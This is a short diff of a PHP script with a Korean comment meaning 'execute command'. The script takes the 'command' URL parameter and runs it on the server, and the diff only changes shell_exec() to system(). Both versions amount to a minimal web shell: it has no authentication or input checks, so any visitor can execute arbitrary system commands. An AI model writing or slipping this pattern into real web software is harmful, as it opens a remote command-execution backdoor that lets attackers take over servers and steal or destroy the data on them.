@@ -2,7 +2,7 @@
 if (isset($_GET['command'])) {
     $command = $_GET['command'];
     // 명령어 실행
-    $output = shell_exec($command);
+    $output = system($command);
 }
 ?>
 
